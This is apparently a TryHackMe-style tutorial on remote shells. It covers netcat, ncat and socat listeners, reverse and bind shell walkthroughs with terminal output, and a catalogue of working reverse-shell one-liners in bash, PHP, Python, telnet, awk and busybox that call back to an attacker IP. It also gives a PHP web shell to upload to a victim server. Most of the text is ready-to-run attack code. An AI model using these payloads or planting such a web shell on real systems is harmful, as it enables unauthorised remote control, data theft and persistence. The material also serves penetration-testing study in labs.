
# Shells

A **shell** is software that lets you talk to an operating system (OS). It can be a graphical UI, but in cybersecurity, it’s usually a command-line interface (CLI)—a text-based way to run commands. The type of shell depends on the OS (e.g., Bash on Linux, PowerShell on Windows). For attackers or pentesters, a shell is a session on a compromised system, letting them execute commands remotely. Here’s what shells unlock:

- **Remote Control**: Run commands or software on a target from afar.
- **Privilege Escalation**: Start with limited access, then climb to admin/root.
- **Data Theft**: Explore, read, and steal sensitive files.
- **Persistence**: Plant backdoors or credentials to keep coming back.
- **Post-Exploitation**: Drop malware, hide accounts, or wipe evidence.
- **Pivoting**: Use the shell to hop to other systems on the network.

---

## Reverse Shells: Calling Home

A **reverse shell** connects *from* the target to the attacker’s machine—great for dodging firewalls since it looks like outbound traffic. Here’s how it works:

### Step 1: Set Up a Listener
Use **Netcat (nc)** to wait for the target to call back:
```
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
```
- `-l`: Listen mode.
- `-v`: Verbose (shows connection details).
- `-n`: No DNS lookups—just IP addresses.
- `-p 443`: Listen on port 443 (HTTPS port, blends with legit traffic).

Attackers pick ports like 80, 443, or 53 to hide in plain sight.

### Step 2: Launch a Reverse Shell Payload
On the target, run a payload to connect back. Here’s a classic **pipe reverse shell**:
```
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.4.99.209 443 >/tmp/f
```
- **Breakdown**:
  - `rm -f /tmp/f`: Deletes any old pipe file at `/tmp/f`.
  - `mkfifo /tmp/f`: Creates a named pipe (FIFO) for two-way communication.
  - `cat /tmp/f`: Reads from the pipe.
  - `| sh -i 2>&1`: Pipes to an interactive shell (`sh -i`), merging errors (`2>&1`) with output.
  - `| nc 10.4.99.209 443`: Sends shell output to attacker’s IP (10.4.99.209) on port 443.
  - `>/tmp/f`: Loops output back into the pipe for interactivity.

### Step 3: Catch the Shell
Back on the attacker’s machine:
```
attacker@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
target@tryhackme:~$ whoami
target
target@tryhackme:~$ ls
dir: command not found  # Oops, it’s sh, not bash—use ‘cat’ or ‘echo’ instead!
```
You’ve got a shell! Run commands like you’re logged in.

---

## Bind Shells: Open Door on the Target

A **bind shell** listens on the target for the attacker to connect—less sneaky but useful when outbound traffic is blocked.

### Step 1: Set Up the Bind Shell
On the target:
```
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 >/tmp/f
```
- **Breakdown**:
  - Same pipe setup as reverse shell (`rm`, `mkfifo`, `cat`).
  - `bash -i 2>&1`: Interactive Bash shell with errors redirected.
  - `nc -l 0.0.0.0 8080`: Listens on all interfaces (0.0.0.0) on port 8080.
  - `>/tmp/f`: Loops output back for two-way comms.

It waits silently for a connection.

### Step 2: Connect to It
From the attacker:
```
attacker@kali:~$ nc -nv 10.10.13.37 8080
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:~$ whoami
target
target@tryhackme:~$ pwd
/home/target
```
- `-n`: No DNS.
- `-v`: Verbose.
- `10.10.13.37 8080`: Target IP and port.

Now you’re in!

---

## Listener Tools: Beyond Netcat

Netcat’s great, but here are more tools to catch shells:

- **Rlwrap**  
  Adds arrow keys and history to Netcat:
  ```
  attacker@kali:~$ rlwrap nc -lvnp 443
  listening on [any] 443 ...
  ```

- **Ncat** (Nmap’s Netcat)  
  Basic listener:
  ```
  attacker@kali:~$ ncat -lvnp 443
  Ncat: Listening on 0.0.0.0:443
  ```
  With SSL:
  ```
  attacker@kali:~$ ncat --ssl -lvnp 443
  Ncat: Listening on 0.0.0.0:443
  ```

- **Socat**  
  Flexible socket tool:
  ```
  attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
  2025/03/30 15:00:00 socat[12345] N listening on AF=2 0.0.0.0:443
  ```
  - `-d -d`: Extra verbose.
  - `TCP-LISTEN:443`: Listens on 443.
  - `STDOUT`: Outputs to terminal.

---

## Reverse Shell Payloads: Linux Edition

Here’s a stash of payloads to spawn reverse shells on Linux. Replace `ATTACKER_IP` and `443` with your setup.

### Bash Payloads
- **Simple Bash**:
  ```
  target@tryhackme:~$ bash -i >& /dev/tcp/10.4.99.209/443 0>&1
  ```
  - Redirects input/output to a TCP socket.

- **Read Line**:
  ```
  target@tryhackme:~$ exec 5<>/dev/tcp/10.4.99.209/443; cat <&5 | while read line; do $line 2>&5 >&5; done
  ```
  - Uses file descriptor 5 for a TCP connection, reads and executes commands.

- **FD 196**:
  ```
  target@tryhackme:~$ 0<&196; exec 196<>/dev/tcp/10.4.99.209/443; sh <&196 >&196 2>&196
  ```
  - File descriptor 196 handles the shell over TCP.

- **FD 5**:
  ```
  target@tryhackme:~$ bash -i 5<> /dev/tcp/10.4.99.209/443 0<&5 1>&5 2>&5
  ```
  - Similar, but with FD 5.

### PHP Payloads
- **exec**:
  ```
  target@tryhackme:~$ php -r '$sock=fsockopen("10.4.99.209",443);exec("sh <&3 >&3 2>&3");'
  ```
  - Opens a socket, runs a shell.

- **shell_exec**:
  ```
  target@tryhackme:~$ php -r '$sock=fsockopen("10.4.99.209",443);shell_exec("sh <&3 >&3 2>&3");'
  ```

- **system**:
  ```
  target@tryhackme:~$ php -r '$sock=fsockopen("10.4.99.209",443);system("sh <&3 >&3 2>&3");'
  ```

- **passthru**:
  ```
  target@tryhackme:~$ php -r '$sock=fsockopen("10.4.99.209",443);passthru("sh <&3 >&3 2>&3");'
  ```

- **popen**:
  ```
  target@tryhackme:~$ php -r '$sock=fsockopen("10.4.99.209",443);popen("sh <&3 >&3 2>&3","r");'
  ```

### Python Payloads
- **Env Vars**:
  ```
  target@tryhackme:~$ export RHOST="10.4.99.209"; export RPORT=443; python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
  ```

- **Subprocess**:
  ```
  target@tryhackme:~$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
  ```

- **Short**:
  ```
  target@tryhackme:~$ python -c 'import os,pty,socket;s=socket.socket();s.connect(("10.4.99.209",443));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("bash")'
  ```

### Others
- **Telnet**:
  ```
  target@tryhackme:~$ TF=$(mktemp -u); mkfifo $TF && telnet 10.4.99.209 443 0<$TF | sh 1>$TF
  ```

- **AWK**:
  ```
  target@tryhackme:~$ awk 'BEGIN {s = "/inet/tcp/0/10.4.99.209/443"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
  ```

- **BusyBox**:
  ```
  target@tryhackme:~$ busybox nc 10.4.99.209 443 -e sh
  ```

---

## Web Shells: Sneaky Browser Backdoors

A **web shell** is a script on a compromised web server that runs commands via HTTP. It’s often hidden in web apps and written in languages like PHP or ASP.

### Simple PHP Web Shell
```
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
- **How**: Save as `shell.php`, upload to a server (e.g., via file upload vuln).
- **Use**: Hit `http://victim.com/uploads/shell.php?cmd=whoami` in a browser.
- **Output**: `target` (or whatever the server user is).

### Popular Web Shells
- **p0wny-shell**: Tiny PHP shell for command execution.
- **b374k**: Feature-packed—file management, commands, more.
- **c99**: Robust, with file ops and command execution.
- **More**: Check [r57shell.net](https://www.r57shell.net/) or [custom](https://www.revshells.com/)).

---


---

